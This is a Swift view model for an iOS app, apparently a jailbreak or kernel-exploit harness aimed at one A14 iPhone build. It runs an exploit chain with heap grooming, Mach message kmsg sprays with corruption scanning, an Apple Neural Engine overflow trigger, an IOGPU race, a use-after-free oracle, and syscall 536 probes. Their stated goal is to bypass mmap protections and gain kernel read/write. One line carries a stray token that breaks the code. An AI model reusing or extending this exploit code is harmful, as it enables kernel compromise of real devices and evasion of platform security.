//
//  Lum1naViewModel.swift
//  Lum1na
//
//  Self-contained view model. Wired to (via Lum1na-Bridging-Header.h):
//    ANEDirectIn            (P059 — direct ANE selector 2, bypasses CoreML)
//    IOGPU64788Controller   (P061 — replace_backing_bytes race, 23F77 pins)
//    P062StaleEntryOracle   (P062 — kalloc.256 stale-entry oracle)
//    P044ExploitController  (existing groom → KRW chain)
//
//  Logging: ObjC probes post NSNotification "Lum1naProbeLog"
//  {tag: String, line: String}; this VM ingests them into the console.
//  Target: iPhone13,2 (A14) — iOS 23F77 ONLY.
//

import SwiftUI
import Combine
import Darwin

// MARK: - Status Types

enum StageStatus: Equatable {
    case notRun
    case running
    case ok
    case fail(errno: Int32, kr: Int32)

    var displayText: String {
        switch self {
        case .notRun:  return "NOT RUN"
        case .running: return "RUNNING"
        case .ok:      return "OK"
        case .fail:    return "FAIL"
        }
    }

    var chipColor: Color {
        switch self {
        case .notRun:  return .gray
        case .running: return .blue
        case .ok:      return .green
        case .fail:    return .red
        }
    }
}

enum ChainState: Equatable {
    case pending, running, complete, failed

    var iconName: String {
        switch self {
        case .pending:  return "circle"
        case .running:  return "arrow.triangle.2.circlepath"
        case .complete: return "checkmark.circle.fill"
        case .failed:   return "xmark.circle.fill"
        }
    }

    var color: Color {
        switch self {
        case .pending:  return .gray
        case .running:  return .blue
        case .complete: return .green
        case .failed:   return .red
        }
    }
}

enum Strategy: String, CaseIterable, Identifiable {
    case aneChain = "ANE Chain"
    case p022     = "P022 Bypass"
    case oracle   = "Oracle"
    var id: String { rawValue }
}

// MARK: - Board Model
// NOTE: named BoardState — the repo already has an ObjC class Lum1naBoard
// (Kernel/Lum1naBoard.h); a Swift type with the same name collides.

struct BoardLeak: Identifiable, Equatable {
    let id = UUID()
    let va: String
    let source: String
    let kind: String
}

struct BoardState: Equatable {
    var hasKread = false
    var hasKwrite = false
    var kslide: UInt64 = 0
    var kbase: UInt64 = 0
    var leaks: [BoardLeak] = []

    var hasLeak: Bool { kslide != 0 || kbase != 0 }
    var hasKRW: Bool { hasKread && hasKwrite }

    static func == (lhs: BoardState, rhs: BoardState) -> Bool {
        lhs.hasKread == rhs.hasKread && lhs.hasKwrite == rhs.hasKwrite &&
        lhs.kslide == rhs.kslide && lhs.kbase == rhs.kbase && lhs.leaks == rhs.leaks
    }

    // Accepts Lum1naBoard JSON dumps:
    // {"hasKread":..., "hasKwrite":..., "kslide":"0x0", "kbase":"0x0",
    //  "leaks":[{"va":"0x...","source":"aio84530","kind":"heap"}, ...]}
    static func from(json: Data) -> BoardState? {
        guard let obj = try? JSONSerialization.jsonObject(with: json) as? [String: Any]
        else { return nil }
        var b = BoardState()
        b.hasKread  = (obj["hasKread"] as? NSNumber)?.boolValue ?? false
        b.hasKwrite = (obj["hasKwrite"] as? NSNumber)?.boolValue ?? false
        b.kslide    = UInt64((obj["kslide"] as? String ?? "0x0").dropFirst(2), radix: 16) ?? 0
        b.kbase     = UInt64((obj["kbase"] as? String ?? "0x0").dropFirst(2), radix: 16) ?? 0
        if let arr = obj["leaks"] as? [[String: Any]] {
            b.leaks = arr.map {
                BoardLeak(va: $0["va"] as? String ?? "0x0",
                          source: $0["source"] as? String ?? "?",
                          kind: $0["kind"] as? String ?? "?")
            }
        }
        return b
    }
}

struct LogEntry: Identifiable, Equatable {
    let id = UUID()
    let timestamp: Date
    let tag: String
    let message: String

    var timeText: String {
        let f = DateFormatter()
        f.dateFormat = "HH:mm:ss"
        return f.string(from: timestamp)
    }

    var color: Color {
        if tag.hasPrefix("P0") { return .blue }          // [P0xx] probes
        switch tag {
        case "+": return .green
        case "-": return .red
        case "!": return .yellow
        default:  return .primary
        }
    }
}

struct P022ProbeResult: Identifiable, Equatable {
    let id = UUID()
    let name: String
    let detail: String
    let ret: Int
    let errnoValue: Int32
    var succeeded: Bool { ret == 0 }
}

enum KRWState: Equatable {
    case pending
    case scanning(count: Int)
    case established
    case failed(reason: String)
}

// MARK: - P022 shared_region Probes (syscall 536, sf_fd = -1)
// Probe A: sf_fd=-1, all-NO_REBASE  → ret 0 = MAC mmap BYPASSED = direct KRW path
// Probe B: real cache fd control    → expect errno (validates the wall)
// Probe C: prot sweep with sf_fd=-1
// NOTE: sf_mapping word layout is a verification guess; errno is ground truth.

enum P022Probes {
    static let mappingWords = 5

    private static func fire(sfFD: Int32, prot: UInt32) -> (Int, Int32) {
        var fbuf = [UInt32](repeating: 0, count: 0x400)
        fbuf[0] = UInt32(bitPattern: sfFD)
        fbuf[1] = 1                                    // sf_mappings = 1
        var mappings = [UInt32](repeating: 0, count: mappingWords)
        mappings[3] = prot                             // prot word — verify vs v37 notes

        let ret = fbuf.withUnsafeMutableBufferPointer { fb in
            mappings.withUnsafeMutableBufferPointer { mp in
                syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
            }
        }
        return (Int(ret), errno)
    }

    static func probeA() -> P022ProbeResult {
        let (ret, err) = fire(sfFD: -1, prot: 5)       // RX, all-NO_REBASE
        return P022ProbeResult(name: "A", detail: "sf_fd=-1 all-NO_REBASE",
                               ret: ret, errnoValue: err)
    }

    static func probeB() -> P022ProbeResult {
        let paths = ["/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
                     "/System/Library/dyld/dyld_shared_cache_arm64e"]
        var fd: Int32 = -1
        for p in paths { fd = open(p, O_RDONLY); if fd >= 0 { break } }
        guard fd >= 0 else {
            return P022ProbeResult(name: "B", detail: "no cache fd available",
                                   ret: -1, errnoValue: ENOENT)
        }
        defer { close(fd) }
        let (ret, err) = fire(sfFD: fd, prot: 5)
        return P022ProbeResult(name: "B", detail: "real-fd control (deny expected)",
                               ret: ret, errnoValue: err)
    }

    static func probeC() -> [P022ProbeResult] {
        let prots: [(String, UInt32)] = [("RO",1), ("W",2), ("RW",3),
                                         ("X",4), ("RX",5), ("RWX",7)]
        return prots.map {
            let (ret, err) = fire(sfFD: -1, prot: $0.1)
            return P022ProbeResult(name: "C", detail: "sf_fd=-1 prot=\($0.0)",
                                   ret: ret, errnoValue: err)
        }
    }
}

// MARK: - View Model

@MainActor
final class Lum1naViewModel: ObservableObject {

    // Board
    @Published var board = BoardState()

    // Stage statuses
    @Published var p044Status: StageStatus = .notRun
    @Published var p022Status: StageStatus = .notRun
    @Published var aneDirectInStatus: StageStatus = .notRun   // P059
    @Published var p061Status: StageStatus = .notRun          // IOGPU 64788 race
    @Published var p062Status: StageStatus = .notRun          // stale-entry oracle
    @Published var kmsgOracleStatus: StageStatus = .notRun    // P060

    // Probe details
    @Published var p022ProbeResults: [P022ProbeResult] = []

    // Chain / counters
    @Published var groomedPairCount = 0
    @Published var corruptedPairCount = 0
    @Published var p062StaleHits = 0
    @Published var krwState: KRWState = .pending
    @Published var groomState: ChainState = .pending
    @Published var aneFireState: ChainState = .pending
    @Published var pairScanState: ChainState = .pending
    @Published var krwChainState: ChainState = .pending

    // Console
    @Published var consoleLogs: [LogEntry] = []
    @Published var activeStrategy: Strategy = .aneChain

    // MARK: Init

    init() {
        log("*", "Lum1na online — target A14 23F77")
        NotificationCenter.default.addObserver(
            forName: NSNotification.Name("Lum1naProbeLog"),
            object: nil, queue: .main
        ) { [weak self] note in
            guard let self,
                  let tag = note.userInfo?["tag"] as? String,
                  let line = note.userInfo?["line"] as? String else { return }
            self.log(tag, line)
        }
    }

    // MARK: Logging

    func log(_ tag: String, _ message: String) {
        consoleLogs.append(LogEntry(timestamp: Date(), tag: tag, message: message))
        if consoleLogs.count > 2000 {
            consoleLogs.removeFirst(consoleLogs.count - 2000)
        }
    }
    func logInfo(_ m: String)    { log("*", m) }
    func logSuccess(_ m: String) { log("+", m) }
    func logError(_ m: String)   { log("-", m) }
    func logWarn(_ m: String)    { log("!", m) }
    func clearLogs()             { consoleLogs.removeAll() }

    // MARK: Board ingestion

    func updateBoard(fromJSON data: Data) {
        guard let b = BoardState.from(json: data) else {
            logError("Board JSON decode failed")
            return
        }
        board = b
        logInfo(String(format: "Board: kslide=0x%llx kbase=0x%llx kread=%d kwrite=%d leaks=%d",
                       board.kslide, board.kbase,
                       board.hasKread ? 1 : 0, board.hasKwrite ? 1 : 0,
                       board.leaks.count))
    }

    // MARK: P044 chain (existing controller)
    // NOTE: adjust only these calls if your P044 entry point differs —
    // everything else in this VM is independent of P044 internals.

    func runP044Chain() {
        guard p044Status != .running else { return }
        p044Status = .running
        groomState = .running
        log("P044", "hole-victim chain: spray → free holes → ANE fire → scan")

        let p044 = P044ExploitController()
        p044.execute()
        let pairs = p044.groomedPairs?.count ?? 0

        groomedPairCount = pairs
        groomState = pairs > 0 ? .complete : .failed
        log(pairs > 0 ? "+" : "-",
            "P044 groom finished — \(pairs) pairs")

        if pairs > 0 {
            pairScanState = .running
            krwState = .scanning(count: pairs)
            logInfo("P044 hands off internally to ANE254 (integrateP044Results) — watch console for KRW result")
        } else {
            p044Status = .fail(errno: 0, kr: 0)
        }
    }

    // MARK: P059 ANEDirectIn

    func runANEDirectIn() {
        guard aneDirectInStatus != .running else { return }
        aneDirectInStatus = .running
        log("P059", "ANEDirectIn — direct ANE selector 2 (bypasses CoreML x_189 wall)")

        let direct = ANEDirectIn.sharedDirectIn()
        if direct.triggerOverflow254WithError(nil) {
            aneDirectInStatus = .ok
            aneFireState = .complete
            logSuccess("P059 request accepted by driver — overflow fill should have run")
            logInfo("Verify with P060 oracle / board state")
        } else {
            aneDirectInStatus = .fail(errno: 0, kr: KERN_FAILURE)
            aneFireState = .failed
            logError("P059 trigger failed — see Documents/p06x_ANEDirectIn_log.txt")
        }
    }

    // MARK: P060 kmsg 3072 Shape-O Oracle (pure Swift, self-contained)

    func runKmsgOracle() {
        guard kmsgOracleStatus != .running else { return }
        kmsgOracleStatus = .running
        corruptedPairCount = 0
        log("P060", "Shape-O oracle: kmsg 3072 spray → ANE fire → signature scan")

        let sprayCount = 64
        let bodySize = 3072
        let marker: UInt8 = 0xAA
        let headerSize = MemoryLayout<mach_msg_header_t>.size

        var ports: [mach_port_t] = []
        var buffers: [UnsafeMutableRawPointer] = []
        var sizes: [Int] = []

        // 1. Spray inline messages (body ~3072 → lands in 4096 kalloc class)
        for _ in 0..<sprayCount {
            var p: mach_port_t = 0
            guard mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS
            else { continue }

            let msgSize = headerSize + bodySize
            let buf = UnsafeMutableRawPointer.allocate(byteCount: msgSize, alignment: 8)
            buf.initializeMemory(as: UInt8.self, repeating: 0, count: msgSize)

            let hdr = buf.assumingMemoryBound(to: mach_msg_header_t.self)
            hdr.pointee.msgh_bits        = UInt32(MACH_MSG_TYPE_MAKE_SEND)
            hdr.pointee.msgh_size        = UInt32(msgSize)
            hdr.pointee.msgh_remote_port = p
            hdr.pointee.msgh_local_port  = 0
            hdr.pointee.msgh_voucher_port = 0
            hdr.pointee.msgh_id          = 0x0600

            let body = buf.advanced(by: headerSize).assumingMemoryBound(to: UInt8.self)
            for i in 0..<bodySize { body[i] = marker }

            let kr = mach_msg(hdr, MACH_SEND_MSG, UInt32(msgSize), 0, 0, 0, 0)
            if kr == KERN_SUCCESS {
                ports.append(p); buffers.append(buf); sizes.append(msgSize)
            } else {
                buf.deallocate()
                mach_port_destroy(mach_task_self(), p)
            }
        }
        logInfo("P060 sprayed \(buffers.count)/\(sprayCount) kmsg bodies @ \(bodySize)B")

        // 2. Fire ANE overflow (P059 path)
        runANEDirectIn()

        // 3. Receive + scan first 16 bytes for corruption over marker
        var corrupted = 0
        for (idx, p) in ports.enumerated() {
            let buf = buffers[idx]
            let hdr = buf.assumingMemoryBound(to: mach_msg_header_t.self)
            hdr.pointee.msgh_bits        = 0
            hdr.pointee.msgh_local_port  = p
            hdr.pointee.msgh_voucher_port = 0

            let kr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                              0, UInt32(sizes[idx]), p, 500, 0)
            guard kr == KERN_SUCCESS else { continue }

            let body = buf.advanced(by: headerSize).assumingMemoryBound(to: UInt8.self)
            var touched = false
            for i in 0..<16 where body[i] != marker { touched = true; break }
            if touched {
                corrupted += 1
                let hex = (0..<16).map { String(format: "%02x", body[$0]) }.joined()
                logSuccess("P060 pair \(idx) CORRUPTED — first 16B: \(hex)")
            }
        }
        for b in buffers { b.deallocate() }
        for p in ports { mach_port_destroy(mach_task_self(), p) }

        corruptedPairCount = corrupted
        if corrupted > 0 {
            kmsgOracleStatus = .ok
            logSuccess("P060: \(corrupted) neighbors corrupted — CVE-2026-43748 lands confirmed")
        } else {
            kmsgOracleStatus = .fail(errno: ENOENT, kr: 0)
            logError("P060: no corruption signature — overflow did not reach sprayed chunks")
        }
    }

    // MARK: P061 IOGPU 64788 replace race

    func runP061(iterations: UInt32 = 32) {
        guard p061Status != .running else { return }
        p061Status = .running
        log("P061", "IOGPU 64788 race — init + replace cycles (23F77 pins)")

        let c = IOGPU64788Controller.sharedController()
        var err: NSError?
        guard c.initializeWithError(&err) else {
            p061Status = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P061 init failed: \(err?.localizedDescription ?? "unknown")")
            return
        }
        c.fire(withIterations: iterations)

        let d = c.raceDiagnostics() ?? [:]
        let okCount  = (d["replaceOK"] as? NSNumber)?.uintValue ?? 0
        let mismatch = (d["lenMismatch"] as? NSNumber)?.uintValue ?? 0
        log("*", String(format: "P061 done — REPLACE_OK=%u lenMismatch=%u", okCount, mismatch))

        p061Status = okCount > 0 ? .ok : .fail(errno: 0, kr: 0)
        if okCount > 0 {
            logSuccess("P061 replace path live — graft P009 GMD reclaim spray next ([GRAFT] point)")
        }
    }

    // MARK: P062 kalloc.256 stale-entry oracle

    func runP062(iterations: UInt32 = 5) {
        guard p062Status != .running else { return }
        p062Status = .running
        p062StaleHits = 0
        log("P062", "stale-entry oracle — 1×65535 trigger, kalloc.256 zero-spray")

        let oracle = P062StaleEntryOracle()
        var err: NSError?
        let landed = oracle.run(withIterations: iterations, error: &err)

        p062StaleHits = Int(oracle.staleHits)
        if landed || oracle.staleHits > 0 {
            p062Status = .ok
            logSuccess("P062 STALE HIT confirmed (0xe0002be) — UAF live on 23F77")
        } else {
            p062Status = .fail(errno: 0, kr: 0)
            logError("P062 no stale hits — see Documents/p06x_P062_log.txt")
        }
    }

    // MARK: P022 probes

    func runP022Probes() {
        guard p022Status != .running else { return }
        p022Status = .running
        p022ProbeResults.removeAll()
        log("P022", "shared_region syscall 536 — probes A/B/C")

        let a = P022Probes.probeA()
        p022ProbeResults.append(a)
        log(a.succeeded ? "+" : "-",
            "P022 A (\(a.detail)): ret=\(a.ret) errno=\(a.errnoValue)")
        if a.succeeded {
            logSuccess("P022 Probe A ret=0 — MAC mmap BYPASSED — direct KRW path live")
        }

        let b = P022Probes.probeB()
        p022ProbeResults.append(b)
        log(b.ret != 0 ? "*" : "!",
            "P022 B (\(b.detail)): ret=\(b.ret) errno=\(b.errnoValue) (nonzero expected)")

        for c in P022Probes.probeC() {
            p022ProbeResults.append(c)
            log(c.succeeded ? "+" : "-",
                "P022 C (\(c.detail)): ret=\(c.ret) errno=\(c.errnoValue)")
        }

        let anySuccess = p022ProbeResults.contains { $0.succeeded }
        if anySuccess {
            p022Status = .ok
ecalogo            logSuccess("P022: bypass confirmed — elevate to KRW workstream")
        } else {
            p022Status = .fail(errno: p022ProbeResults.first?.errnoValue ?? 0, kr: 0)
            logError("P022: all probes errno — sf_fd=-1 appears walled on 23F77")
        }
    }
}
